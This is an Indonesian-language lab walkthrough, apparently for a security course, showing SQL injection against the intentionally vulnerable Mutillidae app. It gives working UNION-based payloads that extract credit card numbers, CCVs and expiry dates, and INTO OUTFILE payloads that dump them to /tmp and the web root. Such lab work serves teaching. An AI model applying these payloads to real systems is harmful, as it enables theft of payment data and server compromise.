Lesson 9
--------
- **Step 1**    : Ketika `mysql` pada metsploit, lalu `use owasp10;` lalu ketik `desc accounts;` dan `desc credit_cards;`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/1.JPG)
- **Step 2**    : Lalu ketik `select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber, ccv, expiration, null from credit_cards;` dan `select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';` juga `\! cat /tmp/CCN.csv`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/3.JPG)
- **Step 3**    : Lalu ubah mozilla pada Kali, lalu buka web mutillidae dan pilih OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info. Lalu ubah size pada kolom **Name** dari **20** menjadi **100** dan isi `' union select ccid,ccnumber,ccv,expiration,null from credit_cards --` dan jangan lupa berikan spasi setelah `--` lalu klik `View Account Details`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/4.JPG)
- Lalu akan muncul hasilnya seperti berikut
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/5.JPG)
- **Step 4**    : Lalu ubah size pada kolom **Name** dari **20** menjadi **100** dan isi dengan `' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' --` dan jangan lupa berikan spasi setelah `--` lalu klik `View Account Details`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/6.JPG)
- Lalu akan muncul
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%209/7.JPG)
